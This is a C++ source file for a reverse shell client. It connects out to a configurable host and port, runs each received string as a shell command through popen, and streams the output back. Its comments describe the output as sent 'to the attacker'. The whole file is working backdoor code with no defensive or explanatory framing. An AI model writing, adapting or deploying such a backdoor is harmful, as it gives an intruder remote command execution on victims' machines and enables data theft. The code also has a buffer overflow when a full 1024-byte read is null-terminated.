#include <iostream>
#include <sys/socket.h>
#include <netinet/in.h>
#include <unistd.h>
#include <cstring>
#include <arpa/inet.h>
#include <array>
#include <memory>
#include <stdexcept>
#include <cstdio>

void executeCommand(const std::string& command, int clientSocket) {
    std::cout << "Executing command: " << command << std::endl;
    std::array<char, 128> buffer;
    std::string result;
    std::string commandWithRedirect = command + " 2>&1";
    std::unique_ptr<FILE, decltype(&pclose)> pipe(popen(commandWithRedirect.c_str(), "r"), pclose);
    if (!pipe) {
        throw std::runtime_error("popen() failed!");
    }
    setbuf(pipe.get(), nullptr); // Disable buffering for real-time output

    while (true) {
        int c = fgetc(pipe.get());
        if (c == EOF) {
            break;
        }
        result += static_cast<char>(c);
        if (c == '\n') {
            std::cout << result; // Stream the output line by line
            send(clientSocket, result.c_str(), result.size(), 0); // Send the line to the attacker
            result.clear();
        }
    }
    std::cout << "Done" << std::endl;
    std::string doneMessage = "COMMAND_EXECUTION_DONE\n";
    send(clientSocket, doneMessage.c_str(), doneMessage.size(), 0); // Send a message to indicate that the command has finished executing
}


int main() {
    // Create a socket
    int clientSocket = socket(AF_INET, SOCK_STREAM, 0);
    if (clientSocket == -1) {
        std::cerr << "Failed to create socket." << std::endl;
        return 1;
    }

    // Set up the server address
    sockaddr_in serverAddress{};
    serverAddress.sin_family = AF_INET;
    serverAddress.sin_port = htons(8080);  // Change this to the desired port
    if (inet_pton(AF_INET, "127.0.0.1", &(serverAddress.sin_addr)) <= 0) {
        std::cerr << "Invalid address." << std::endl;
        return 1;
    }

    // Connect to the server
    if (connect(clientSocket, (struct sockaddr*)&serverAddress, sizeof(serverAddress)) < 0) {
        std::cerr << "Failed to connect to the server." << std::endl;
        return 1;
    }

    // Receive and print data
    char buffer[1024];
    ssize_t bytesRead;
    while ((bytesRead = read(clientSocket, buffer, sizeof(buffer))) > 0) {
        buffer[bytesRead] = '\0'; // Null-terminate the received data
        std::cout.write(buffer, bytesRead);
        std::cout << "request received" << std::endl;

        // Execute the command and send the output to the attacker
        std::string command = std::string(buffer);
        executeCommand(command, clientSocket); // Modify this line

        memset(buffer, 0, sizeof(buffer)); // Clear the buffer
    }

    // Close the socket
    close(clientSocket);

    return 0;
}